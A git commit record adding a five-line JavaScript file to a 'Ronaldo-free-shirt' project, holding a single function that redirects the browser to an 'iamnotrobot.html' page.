8183481b95ac78d47258c05ccccf5b41d1130726
Marce1OG <159509850+Marce1OG@users.noreply.github.com>
2024-11-20 05:44:49 +0100

    Add files via upload

---
+++ Ronaldo-free-shirt/ronaldo.js
@@ -0,0 +1,5 @@
+// Function to redirect to the 'iamnotrobot.html' page
+function redirectToRobotPage() {
+  // Navigate to the "You Are Not a Robot" page
+  window.location.href = "iamnotrobot.html";
+}
